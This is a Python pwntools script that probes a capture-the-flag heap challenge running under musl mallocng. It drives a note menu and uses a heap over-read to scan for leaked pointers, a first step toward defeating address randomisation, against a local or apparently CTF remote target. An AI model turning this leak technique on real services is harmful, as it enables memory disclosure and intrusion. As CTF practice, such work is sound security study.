#!/usr/bin/env python3
"""
Probe memory layout of atypical_heap under musl mallocng.
Goal: find relationship between leaked brk heap ptr and libc/binary base.
"""
from pwn import *
import struct

BINARY = "./dist/chall"
LIBC = "./dist/libc.so"
HOST, PORT = "localhost", 11337

context.binary = ELF(BINARY, checksec=False)
context.log_level = 'info'

def get_process():
    if args.REMOTE:
        return remote("34.159.70.241", 30931)
    elif args.GDB:
        return gdb.debug([LIBC, BINARY], gdbscript='b *main\nc\n')
    else:
        return remote(HOST, PORT)

def alloc(io, idx, sz):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"Enter size: ", str(sz).encode())

def free_note(io, idx):
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"index: ", str(idx).encode())

def write_note(io, idx, data):
    io.sendlineafter(b"> ", b"3")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(len(data)).encode())
    io.sendafter(b"data: ", data)

def read_note(io, idx, sz):
    io.sendlineafter(b"> ", b"4")
    io.sendlineafter(b"index: ", str(idx).encode())
    io.sendlineafter(b"size: ", str(sz).encode())
    return io.recv(sz, timeout=2)

def magic_write(io, addr, value):
    io.sendlineafter(b"> ", b"5")
    io.sendlineafter(b"address: ", hex(addr).encode())
    io.sendlineafter(b"value: ", str(value).encode())

def probe():
    io = get_process()

    # Get PID for /proc access (only works locally via docker exec)
    # We'll use the over-read to find pointers

    # Allocate several notes of different sizes to see what we leak
    # Size 0x10 (smallest) - should give us sc=0 or small sizeclass
    for i in range(16):
        alloc(io, i, 0x10)
        write_note(io, i, b"A" * 0x10)

    # Now over-read each note to find pointers
    print("\n=== Over-read scan (16 notes, size 0x10, read 0x100) ===")
    for i in range(16):
        data = read_note(io, i, 0x100)
        # Look for pointer-like values (0x7f... or 0x55...)
        ptrs = []
        for off in range(0, len(data) - 7, 8):
            val = u64(data[off:off+8])
            if val > 0x10000 and val < 0x7fffffffffff:
                ptrs.append((off, val))
        if ptrs:
            print(f"\nNote {i}: data starts with {data[:16].hex()}")
            for off, val in ptrs:
                print(f"  offset +0x{off:02x}: 0x{val:016x}")

    # Now try with a different allocation size (0x80)
    # First free all
    for i in range(16):
        free_note(io, i)

    for i in range(16):
        alloc(io, i, 0x80)
        write_note(io, i, b"B" * 0x80)

    print("\n=== Over-read scan (16 notes, size 0x80, read 0x100) ===")
    for i in range(16):
        data = read_note(io, i, 0x100)
        ptrs = []
        for off in range(0, len(data) - 7, 8):
            val = u64(data[off:off+8])
            if val > 0x10000 and val < 0x7fffffffffff:
                ptrs.append((off, val))
        if ptrs:
            print(f"\nNote {i}: data starts with {data[:16].hex()}")
            for off, val in ptrs:
                print(f"  offset +0x{off:02x}: 0x{val:016x}")

    io.close()

if __name__ == "__main__":
    probe()
